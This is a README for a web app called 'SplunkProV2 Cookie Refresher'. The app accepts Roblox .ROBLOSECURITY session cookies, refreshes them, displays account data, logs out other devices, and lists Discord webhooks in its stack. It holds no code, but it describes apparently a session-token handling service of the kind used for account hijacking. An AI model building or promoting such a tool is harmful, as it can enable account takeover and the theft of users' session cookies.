# SplunkProV2 Cookie Refresher

A modern web application for refreshing Roblox `.ROBLOSECURITY` cookies with account information retrieval.

## Features

- 🛡️ Secure cookie refresh
- 📊 Account data display (Username, Robux, Groups, Avatar)
- 🔓 Logout all devices
- 📋 Copy cookie to clipboard
- 🎨 Modern UI with animations
- 💻 Full-stack JavaScript (Node.js + Express)

## Installation

1. Clone the repository
2. Install dependencies:
```bash
npm install
```

3. Start the server:
```bash
npm start
```

4. Open your browser to `http://localhost:3000`

## Deployment

### Vercel

1. Push code to GitHub
2. Visit [vercel.com](https://vercel.com)
3. Import your repository
4. Deploy
5. Your app will be live at `yourproject.vercel.app`

## API Endpoints

- `POST /api/logout` - Logout all devices
- `POST /api/refresh` - Refresh cookie and get account info

## Tech Stack

- **Backend**: Node.js + Express
- **Frontend**: HTML5 + CSS3 + Vanilla JavaScript
- **API**: Roblox API + Discord Webhooks

## License

ISC
